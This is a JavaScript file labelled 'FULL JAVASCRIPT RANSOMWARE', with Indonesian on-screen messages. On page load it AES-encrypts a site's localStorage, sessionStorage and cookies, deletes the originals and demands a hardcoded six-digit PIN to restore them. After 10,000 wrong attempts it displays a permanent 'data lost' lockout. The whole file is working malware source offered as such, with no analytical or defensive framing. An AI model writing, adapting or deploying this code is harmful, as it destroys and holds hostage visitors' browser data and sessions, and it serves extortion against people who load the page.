// FULL JAVASCRIPT RANSOMWARE
const MASTER_PIN = "568729";
let wrongAttempts = parseInt(localStorage.getItem('sorebs_attempts')) || 0;
const MAX_ATTEMPTS = 10000;

function checkPermanentLock() {
    if(localStorage.getItem('sorebs_permanent') === '1') {
        document.body.innerHTML = `<div style="background:#000;color:red;text-align:center;padding:80px;font-size:30px;">💀 DATA PERMANEN HILANG 💀</div>`;
        throw new Error("LOCKED");
    }
}

function updateCounter() {
    const remaining = MAX_ATTEMPTS - wrongAttempts;
    const counterEl = document.getElementById('attemptCounter');
    if(counterEl) {
        counterEl.innerHTML = `❌ Salah: ${wrongAttempts}/${MAX_ATTEMPTS} | Sisa: ${remaining} ❌`;
    }
}

function encryptAll() {
    const key = CryptoJS.lib.WordArray.random(64).toString();
    let lsData = {};
    for(let i = 0; i < localStorage.length; i++) {
        let k = localStorage.key(i);
        if(k !== 'sorebs_attempts' && k !== 'sorebs_permanent') {
            lsData[k] = localStorage.getItem(k);
        }
    }
    localStorage.setItem('sorebs_ls', CryptoJS.AES.encrypt(JSON.stringify(lsData), key));
    
    let ssData = {};
    for(let i = 0; i < sessionStorage.length; i++) {
        let k = sessionStorage.key(i);
        ssData[k] = sessionStorage.getItem(k);
    }
    localStorage.setItem('sorebs_ss', CryptoJS.AES.encrypt(JSON.stringify(ssData), key));
    
    localStorage.setItem('sorebs_ck', CryptoJS.AES.encrypt(document.cookie, key));
    localStorage.setItem('sorebs_key', key);
    localStorage.setItem('sorebs_lock', '1');
    
    for(let i = 0; i < localStorage.length; i++) {
        let k = localStorage.key(i);
        if(k !== 'sorebs_attempts' && k !== 'sorebs_permanent' && 
           k !== 'sorebs_ls' && k !== 'sorebs_ss' && k !== 'sorebs_ck' && 
           k !== 'sorebs_key' && k !== 'sorebs_lock') {
            localStorage.removeItem(k);
        }
    }
    sessionStorage.clear();
    document.cookie.split(";").forEach(c => {
        document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/");
    });
}

function restoreData(pin) {
    if(pin !== MASTER_PIN) {
        wrongAttempts++;
        localStorage.setItem('sorebs_attempts', wrongAttempts);
        updateCounter();
        alert(`PIN SALAH! Sisa ${MAX_ATTEMPTS - wrongAttempts} percobaan`);
        if(wrongAttempts >= MAX_ATTEMPTS) {
            localStorage.setItem('sorebs_permanent', '1');
            location.reload();
        }
        return false;
    }
    
    const key = localStorage.getItem('sorebs_key');
    if(key) {
        let lsEnc = localStorage.getItem('sorebs_ls');
        if(lsEnc) {
            let dec = CryptoJS.AES.decrypt(lsEnc, key).toString(CryptoJS.enc.Utf8);
            let data = JSON.parse(dec);
            for(let [k,v] of Object.entries(data)) localStorage.setItem(k,v);
        }
        let ssEnc = localStorage.getItem('sorebs_ss');
        if(ssEnc) {
            let dec = CryptoJS.AES.decrypt(ssEnc, key).toString(CryptoJS.enc.Utf8);
            let data = JSON.parse(dec);
            for(let [k,v] of Object.entries(data)) sessionStorage.setItem(k,v);
        }
        let ckEnc = localStorage.getItem('sorebs_ck');
        if(ckEnc) {
            let dec = CryptoJS.AES.decrypt(ckEnc, key).toString(CryptoJS.enc.Utf8);
            dec.split(';').forEach(c => { if(c.trim()) document.cookie = c.trim() + ";path=/"; });
        }
    }
    
    localStorage.clear();
    alert("✅ UNLOCK BERHASIL! DATA KEMBALI NORMAL ✅");
    location.reload();
}

checkPermanentLock();
if(localStorage.getItem('sorebs_lock') !== '1') encryptAll();
updateCounter();

document.getElementById('unlockButton')?.addEventListener('click', () => {
    let pin = document.getElementById('pinInput').value;
    if(pin.length === 6 && /^\d+$/.test(pin)) restoreData(pin);
    else alert("PIN harus 6 digit angka!");
});